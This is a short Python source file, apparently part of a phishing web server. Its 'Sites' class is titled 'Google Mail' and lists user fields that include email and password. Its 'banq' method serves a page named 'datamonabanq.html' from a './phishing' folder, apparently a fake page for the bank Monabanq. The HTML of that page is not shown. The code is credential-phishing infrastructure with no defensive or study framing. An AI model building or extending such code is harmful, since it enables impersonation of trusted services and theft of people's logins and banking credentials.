import re
from render import Render
from fichier import Fichier
import subprocess
from myfunc import Myfunc
from db import Db
from myrecording import Myrecording
class Sites(Myfunc):
  def __init__(self,path):
    self.path=path
    self.title="Google Mail"
    self.figure=Render(self.title)
    self.recparams=["name","image","price","date"]
    self.userparams=["nom","prenom","datenaissance","genre","email","password","password_confirmation"]
  def get_figure(self):
    return self.figure
  def banq(self,myscrit):
    self.figure.set_body("")
    self.figure.withouttemplate()
    self.figure.set_content(Fichier("./phishing","datamonabanq.html").lire())
    print("hi there")
    return self
